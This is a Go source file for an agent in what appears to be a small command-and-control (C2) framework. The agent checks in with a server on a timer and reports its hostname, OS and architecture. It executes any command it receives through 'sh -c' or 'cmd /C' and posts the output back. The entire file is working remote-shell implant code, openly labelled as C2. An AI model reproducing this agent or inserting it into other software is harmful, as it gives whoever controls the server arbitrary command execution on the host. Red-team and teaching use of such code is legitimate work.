// Package agent implements the C2 agent that checks in with the server,
// executes received commands, and reports results back.
package agent

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"os/exec"
	"runtime"
	"time"

	"github.com/lsanarchist/c2/pkg/protocol"
)

// Agent periodically checks in with the C2 server.
type Agent struct {
	id         string
	hostname   string
	serverURL  string
	interval   time.Duration
	httpClient *http.Client
}

// New creates a new Agent.
func New(id, hostname, serverURL string, interval time.Duration) *Agent {
	return &Agent{
		id:         id,
		hostname:   hostname,
		serverURL:  serverURL,
		interval:   interval,
		httpClient: &http.Client{Timeout: 10 * time.Second},
	}
}

// RunOnce performs a single check-in cycle. It is primarily useful for testing.
func (a *Agent) RunOnce() {
	a.checkIn()
}

// Run starts the agent check-in loop. It blocks until ctx is done or an
// unrecoverable error occurs.
func (a *Agent) Run() {
	log.Printf("[agent] starting, id=%s server=%s", a.id, a.serverURL)
	ticker := time.NewTicker(a.interval)
	defer ticker.Stop()

	// Check in immediately on startup.
	a.checkIn()

	for range ticker.C {
		a.checkIn()
	}
}

// checkIn sends a check-in request to the server and handles any returned command.
func (a *Agent) checkIn() {
	ci := protocol.CheckIn{
		ID:       a.id,
		Hostname: a.hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
	}

	body, err := json.Marshal(ci)
	if err != nil {
		log.Printf("[agent] marshal error: %v", err)
		return
	}

	resp, err := a.httpClient.Post(a.serverURL+"/checkin", "application/json", bytes.NewReader(body))
	if err != nil {
		log.Printf("[agent] check-in failed: %v", err)
		return
	}
	defer resp.Body.Close()

	var ciResp protocol.CheckInResponse
	if err := json.NewDecoder(resp.Body).Decode(&ciResp); err != nil {
		log.Printf("[agent] decode response error: %v", err)
		return
	}

	if ciResp.Command == "" {
		return
	}

	log.Printf("[agent] executing command %s: %s", ciResp.CommandID, ciResp.Command)
	output, execErr := a.execute(ciResp.Command)

	result := protocol.Result{
		AgentID:   a.id,
		CommandID: ciResp.CommandID,
		Output:    output,
	}
	if execErr != nil {
		result.Error = execErr.Error()
	}

	a.sendResult(result)
}

// execute runs the given shell command and returns its combined output.
func (a *Agent) execute(command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// sendResult posts a command result back to the server.
func (a *Agent) sendResult(result protocol.Result) {
	body, err := json.Marshal(result)
	if err != nil {
		log.Printf("[agent] marshal result error: %v", err)
		return
	}

	resp, err := a.httpClient.Post(a.serverURL+"/result", "application/json", bytes.NewReader(body))
	if err != nil {
		log.Printf("[agent] send result failed: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent {
		log.Printf("[agent] unexpected result response: %d", resp.StatusCode)
	}
}
